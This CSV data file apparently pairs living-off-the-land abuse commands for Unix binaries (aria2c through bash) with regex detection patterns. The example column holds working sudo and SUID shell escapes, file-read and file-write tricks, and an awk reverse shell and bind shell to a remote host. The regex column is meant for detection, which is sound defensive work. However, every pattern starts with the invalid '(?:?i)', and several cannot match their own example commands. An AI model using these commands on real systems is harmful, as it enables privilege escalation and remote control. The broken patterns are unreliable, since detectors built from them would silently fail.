Name,Function,ExampleCode,Regex,Notes
aria2c,file-download,"aria2c -o ""$LFILE"" ""$URL""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?aria2c\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
aria2c,sudo,"echo ""$COMMAND"" > $TF
chmod +x $TF
sudo aria2c --on-download-error=$TF http://x","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?aria2c\s*\-\-on\-download\-error\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
aria2c,limited-suid,"echo ""$COMMAND"" > $TF
chmod +x $TF
./aria2c --on-download-error=$TF http://x","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?aria2c\s*\-\-on\-download\-error\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
arj,file-read,"arj a ""$TF"" ""$LFILE""
arj p ""$TF""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?arj\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
arj,file-write,"echo DATA >""$TF/$LFILE""
arj a ""$TF/a"" ""$TF/$LFILE""
arj e ""$TF/a"" $LDIR","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?arj\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
arj,sudo,"echo DATA >""$TF/$LFILE""
arj a ""$TF/a"" ""$TF/$LFILE""
sudo arj e ""$TF/a"" $LDIR","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?arj\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
arj,suid,"echo DATA >""$TF/$LFILE""
arj a ""$TF/a"" ""$TF/$LFILE""
./arj e ""$TF/a"" $LDIR","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?arj\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
arp,file-read,"arp -v -f ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?arp\s*\-v\s*\-f\s+(?:-F\b|--form\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
arp,suid,"./arp -v -f ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?arp\s*\-v\s*\-f\s+(?:-F\b|--form\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
arp,sudo,"sudo arp -v -f ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?arp\s*\-v\s*\-f\s+(?:-F\b|--form\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
as,file-read,as @$LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?as\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
as,suid,./as @$LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?as\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
as,sudo,sudo as @$LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?as\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ascii-xfr,file-read,"ascii-xfr -ns ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ascii\-xfr\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ascii-xfr,suid,"./ascii-xfr -ns ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ascii\-xfr\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ascii-xfr,sudo,"sudo ascii-xfr -ns ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ascii\-xfr\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ascii85,file-read,"ascii85 ""$LFILE"" | ascii85 --decode","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ascii85\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ascii85,sudo,"sudo ascii85 ""$LFILE"" | ascii85 --decode","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ascii85\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ash,shell,ash,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ash\s+.+),
ash,file-write,"export LFILE=file_to_write
ash -c 'echo DATA > $LFILE'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ash\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ash,suid,./ash,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ash\s+.+),
ash,sudo,sudo ash,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ash\s+.+),
aspell,file-read,"aspell -c ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?aspell\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
aspell,suid,"./aspell -c ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?aspell\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
aspell,sudo,"sudo aspell -c ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?aspell\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
at,shell,"echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | at now; tail -f /dev/null",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?at\s*\-f\s+(?:/bin/(?:sh|bash)).*(?:-F\b|--form\b)),
at,command,"echo ""$COMMAND"" | at now","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?at\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
at,sudo,"echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | sudo at now; tail -f /dev/null",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?at\s*\-f\s+(?:/bin/(?:sh|bash)).*(?:-F\b|--form\b)),
atobm,file-read,"atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?atobm\s*\-F\s+(?:\bprintf\b).*(?:-F\b|--form\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
atobm,sudo,"sudo atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?atobm\s*\-F\s+(?:\bprintf\b).*(?:-F\b|--form\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
atobm,suid,"./atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?atobm\s*\-F\s+(?:\bprintf\b).*(?:-F\b|--form\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
awk,shell,"awk 'BEGIN {system(""/bin/sh"")}'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?awk\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
awk,non-interactive-reverse-shell,"awk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
s = ""/inet/tcp/0/"" RHOST ""/"" RPORT;
while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?awk\s*\-v\s*\-v\s+(?:\bBEGIN\b).*(?:\bprintf\b).*(?:\bgetline\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
awk,non-interactive-bind-shell,"awk -v LPORT=$LPORT 'BEGIN {
s = ""/inet/tcp/"" LPORT ""/0/0"";
while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?awk\s*\-v\s+(?:\bBEGIN\b).*(?:\bprintf\b).*(?:\bgetline\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
awk,file-write,"awk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?awk\s*\-v\s+(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
awk,file-read,"awk '//' ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?awk\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
awk,suid,"./awk '//' ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?awk\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
awk,sudo,"sudo awk 'BEGIN {system(""/bin/sh"")}'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?awk\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
awk,limited-suid,"./awk 'BEGIN {system(""/bin/sh"")}'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?awk\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
aws,shell,"aws help
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?aws\s+(?:/bin/(?:sh|bash))),
aws,sudo,"sudo aws help
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?aws\s+(?:/bin/(?:sh|bash))),
base32,file-read,"base32 ""$LFILE"" | base32 --decode","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?base32\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
base32,suid,"base32 ""$LFILE"" | base32 --decode","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?base32\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
base32,sudo,"sudo base32 ""$LFILE"" | base32 --decode","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?base32\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
base58,file-read,"base58 ""$LFILE"" | base58 --decode","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?base58\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
base58,sudo,"sudo base58 ""$LFILE"" | base58 --decode","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?base58\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
base64,file-read,"base64 ""$LFILE"" | base64 --decode","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?base64\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
base64,suid,"./base64 ""$LFILE"" | base64 --decode","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?base64\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
base64,sudo,"sudo base64 ""$LFILE"" | base64 --decode","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?base64\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
basenc,file-read,basenc --base64 $LFILE | basenc -d --base64,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?basenc\s*\-\-base64\s*\-d\s*\-\-base64\s+(?:--data\b|--data-raw\b|-d\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
basenc,suid,basenc --base64 $LFILE | basenc -d --base64,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?basenc\s*\-\-base64\s*\-d\s*\-\-base64\s+(?:--data\b|--data-raw\b|-d\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
basenc,sudo,sudo basenc --base64 $LFILE | basenc -d --base64,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?basenc\s*\-\-base64\s*\-d\s*\-\-base64\s+(?:--data\b|--data-raw\b|-d\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
basez,file-read,"basez ""$LFILE"" | basez --decode","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?basez\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
basez,suid,"./basez ""$LFILE"" | basez --decode","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?basez\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
basez,sudo,"sudo basez ""$LFILE"" | basez --decode","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?basez\s*\-\-decode\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bash,shell,bash,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bash\s+.+),
